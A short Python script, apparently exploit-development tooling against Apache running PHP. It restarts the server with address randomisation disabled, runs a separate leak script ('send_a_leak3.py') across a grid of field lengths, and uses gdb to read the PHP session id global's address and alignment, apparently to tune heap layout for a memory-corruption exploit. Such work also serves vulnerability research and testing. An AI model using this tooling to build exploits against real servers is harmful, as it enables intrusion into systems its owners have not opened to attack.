#!/usr/bin/env python3
import subprocess, re, time, sys
def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)
def stopstart():
    sh("sudo -n apache2ctl -k stop")
    time.sleep(0.18)
    sh('sudo -n bash -c "setarch $(uname -m) -R /usr/sbin/apache2ctl -k start"')
    time.sleep(0.22)
def worker():
    out=sh('pgrep -f "^/usr/sbin/apache2 -k start" | tail -1').stdout.strip()
    return out
def getid():
    pid=worker()
    if not pid: return None
    out=sh(f"sudo -n gdb -q -p {pid} -batch -ex 'p/x (unsigned long)ps_globals.id' 2>/dev/null").stdout
    m=re.search(r'\$\d+ = (0x[0-9a-f]+)', out)
    return int(m.group(1),16) if m else None
def one(nl,vl,bnl,huge=12):
    stopstart()
    sh(f"python3 send_a_leak3.py 1001 {nl} {vl} {huge} {bnl} >/dev/null 2>&1")
    time.sleep(0.15)
    a=getid()
    return a
grid=[]
for nl in range(30,41): grid.append((nl,1,17))
for vl in range(30,41): grid.append((5,vl,17))
for bnl in [8,10,12,14,16,17,18,20,24]: grid.append((5,1,bnl))
for nl,vl,bnl in grid:
    a=one(nl,vl,bnl)
    if a is None:
        print(f"NL={nl} VL={vl} BNL={bnl} ID=? MOD56=?")
    else:
        print(f"NL={nl} VL={vl} BNL={bnl} ID=0x{a:x} OFF=0x{a & 0x1fffff:x} MOD56={a%56} MOD56HEX={a%56:#x}")
